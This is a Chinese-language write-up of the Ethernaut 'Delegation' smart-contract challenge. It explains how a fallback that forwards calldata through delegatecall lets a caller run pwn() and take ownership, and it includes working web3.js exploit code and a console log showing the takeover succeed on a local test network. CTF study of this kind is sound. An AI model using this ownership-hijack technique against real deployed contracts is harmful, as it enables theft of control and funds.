# 07 Delegation

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

目标: 将`Delegation`合约中的owner改为player

`fallback`函数声明中不是`payable`的, 所以只能通过调用一个不存在的函数来引发它

引发后,  如果能让它通过`delegatecall`的方式调用`Delegate`合约中的`pwn`函数, 那么则能成功修改owner(由于是`delegatecall`, 所以`msg.sender`保持不变)

所以将`pwn()`的ABI签名作为`msg.data`传入即可.



```js
const functionSignature = web3.eth.abi.encodeFunctionSignature('pwn()');
const txParams = {
  from: player,
  to: instance,
  data: functionSignature
};
web3.eth.sendTransaction(txParams, (err, transactionHash) => {
  if (err) {
    console.error(err);
  } else {
    console.log(`Transaction hash: ${transactionHash}`);
  }
});
```



## delegatecall

Delegatecall是Solidity中的一个特殊函数，它允许调用者通过当前合约在另一个合约上调用函数。与普通的调用（call）不同，delegatecall会使用调用者的上下文和权限，而不是当前合约的上下文和权限来执行调用。这意味着，如果一个合约使用delegatecall在另一个合约上调用函数，那么这个函数将能够访问调用者的存储、账户余额和非常量的消息属性。

这个就相当于使用被调用者的算法逻辑, 但使用调用者的数据存储和消息属性(msg的相关属性仍然是调用者的).

这有些类似于library, 但由于library有一些限制, 所以delegatecall和library的使用场景不一样.

library的一些: 它不能像普通合约那样独立执行，而只能被其他合约调用。这意味着，library中的函数不能更改合约的存储状态，也不能接收外部交易。此外，library中的函数也不能直接使用msg、tx和block等关键字，因为它们是属于消息和区块上下文的。



举例:

假设有两个合约A和B，其中A想要通过delegatecall在B上调用一个函数。首先，A需要在自己的合约中保存一个指向B的指针，然后就可以通过这个指针调用B中的函数了。例如：

```solidity
// 在A中保存一个指向B的指针
address public B;

// 调用B中的foo函数
function callFooInB() public {
    // 在B上调用foo函数，使用A的上下文和权限
    B.delegatecall(bytes4(keccak256("foo()")));
}

```



`delegatecall`函数参数是被调用的函数签名的前4个字节, 以及函数参数



## 计算函数签名

可以使用`keccak256`函数来计算函数的签名。例如，在这个例子中，可以使用下面的代码来计算第一个函数的签名

```solidity
function myFunction(uint a) public {
  bytes32 signature = keccak256(abi.encodePacked("myFunction(uint256)"));
  // some code here
}

```



## web3.eth.abi.encodeFunctionSignature

https://learnblockchain.cn/docs/web3.js/web3-eth-abi.html#encodefunctionsignature





## 参考答案

```
VM367 content.js:58 Uncaught Error: pagejs missing. Please see http://tmnk.net/faq#Q208 for more information.
(anonymous) @ VM367 content.js:58
t @ VM367 content.js:44
(anonymous) @ VM367 content.js:44
setTimeout (async)
Fo @ VM367 content.js:44
(anonymous) @ VM367 content.js:58
Sn @ VM367 content.js:15
(anonymous) @ VM367 content.js:58
Sn @ VM367 content.js:15
(anonymous) @ VM367 content.js:58
(anonymous) @ VM367 content.js:62
(anonymous) @ VM367 content.js:62
(anonymous) @ VM367 content.js:62
DevTools failed to load source map: Could not load content for chrome-extension://dmkamcknogkgcdfhhbddcghachkejeap/browser-polyfill.js.map: HTTP error: status code 404, net::ERR_UNKNOWN_URL_SCHEME
log.js:24 [HMR] Waiting for update signal from WDS...
react-dom.development.js:29840 Download the React DevTools for a better development experience: https://reactjs.org/link/react-devtools
redux-logger.js:1  action CONNECT_WEB3 @ 10:50:12.970
crack.js:1 super_copy_cracked:false
^^.js:103 src/middlewares/loadGamedata.js  Line 16:13:  'network' is assigned a value but never used  no-unused-varssrc/middlewares/setNetwork.js  Line 85:3:  'onWrongNetwork' is assigned a value but never used  no-unused-vars
logger.warn @ ^^.js:103
printWarnings @ webpackHotDevClient.js:138
handleWarnings @ webpackHotDevClient.js:143
push.../node_modules/react-dev-utils/webpackHotDevClient.js.connection.onmessage @ webpackHotDevClient.js:210
setNetwork.js:83 id:1337, all id:5,420,1337,80001,421613,11155111
^^.js:35 => Current network: local
redux-logger.js:1  action SET_NETWORK_ID @ 10:50:13.105
redux-logger.js:1  action LOAD_GAME_DATA @ 10:50:13.106
^^.js:56 Delegation
^^.js:113 输入 help() 获得web3加载项
^^.js:35 => 关卡地址0xBC1266542ACff57a9E1E713209D5910acD83A840
redux-logger.js:1  action ACTIVATE_LEVEL @ 10:50:13.115
index.js:1 [OptinMonster],[object XMLHttpRequest]
console.<computed> @ index.js:1
logger.error @ ^^.js:93
S.error @ api.min.js:1
errors @ api.min.js:1
(anonymous) @ api.min.js:1
Promise.catch (async)
getCampaigns @ api.min.js:1
init @ api.min.js:1
init @ api.min.js:1
preInit @ api.min.js:1
c @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
api.min.js:1 GET https://campaigns.openzeppelin.com/api/v2/embed/131584?d=localhost net::ERR_CONNECTION_CLOSED
(anonymous) @ api.min.js:1
send @ api.min.js:1
getCampaigns @ api.min.js:1
init @ api.min.js:1
init @ api.min.js:1
preInit @ api.min.js:1
c @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
redux-logger.js:1  action CONNECT_WEB3 @ 10:50:15.411
^^.js:35 => 玩家地址0xC01471287E5AC8A007cf7aA733a1660FBB52b476
redux-logger.js:1  action SET_PLAYER_ADDRESS @ 10:50:15.422
redux-logger.js:1  action LOAD_ETHERNAUT_CONTRACT @ 10:50:15.424
redux-logger.js:1  action SET_BLOCK_NUM @ 10:50:15.449
redux-logger.js:1  action SET_GAS_PRICE @ 10:50:15.454
^^.js:35 => 以太坊地址0x8382abe5a0a0F731e9b2ad8B6f0E4e1D9976F46F
redux-logger.js:1  action SYNC_PLAYER_PROGRESS @ 10:50:15.475
^^.js:35 => 实例地址0xA596798537B81143ea4783fa8cBCD27CA0E32a64
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:50:15.476
^^.js:45 |[●▪▪●]| 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:50:17.055
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x93bbd329f6dfce4bf37f971872aade282a937365beb43898f8943853a4dd615f
^^.js:35 => 实例地址0xf7A415Fe1d7795024Ff90f16185375C69694d487
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:50:21.545
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x93bbd329f6dfce4bf37f971872aade282a937365beb43898f8943853a4dd615f
redux-logger.js:1  action SET_BLOCK_NUM @ 10:50:25.479

const functionSignature = web3.eth.abi.encodeFunctionSignature('pwn()');
console.log(functionSignature); 

const txParams = {
  from: player,
  to: instance,
  data: functionSignature
};

web3.eth.sendTransaction(txParams, (err, transactionHash) => {
  if (err) {
    console.error(err);
  } else {
    console.log(`Transaction hash: ${transactionHash}`);
  }
});

await contract.owner()
player
VM418:3 0xdd365b8b
"0xC01471287E5AC8A007cf7aA733a1660FBB52b476"
VM418:15 Transaction hash: 0xadfeb96d12867a11baba35031eecda50aa37569300201460ad90b2e05ad8efd2
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xadfeb96d12867a11baba35031eecda50aa37569300201460ad90b2e05ad8efd2
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xadfeb96d12867a11baba35031eecda50aa37569300201460ad90b2e05ad8efd2
redux-logger.js:1  action SET_BLOCK_NUM @ 10:50:35.441
await contract.owner()
"0xC01471287E5AC8A007cf7aA733a1660FBB52b476"
player
"0xC01471287E5AC8A007cf7aA733a1660FBB52b476"
^^.js:45 ^⨀ᴥ⨀^ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 10:57:03.433
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x04d8e3b9a0ef68955e64b02d940a2772a9ed1460b92265376349f3a13d7bfdcc
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 10:57:08.985
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x04d8e3b9a0ef68955e64b02d940a2772a9ed1460b92265376349f3a13d7bfdcc
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:73 (-(-_(-_-)_-)-) 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 10:57:15.404
redux-logger.js:1  action SET_GAS_PRICE @ 11:20:15.476
redux-logger.js:1  action SET_GAS_PRICE @ 11:50:15.492
redux-logger.js:1  action SET_GAS_PRICE @ 12:20:17.489
redux-logger.js:1  action SET_GAS_PRICE @ 12:50:17.491
redux-logger.js:1  action SET_GAS_PRICE @ 13:20:17.497
web3.eth.Contract.defaultAccount
null
redux-logger.js:1  action SET_GAS_PRICE @ 13:50:15.712
redux-logger.js:1  action SET_GAS_PRICE @ 14:20:17.701

```

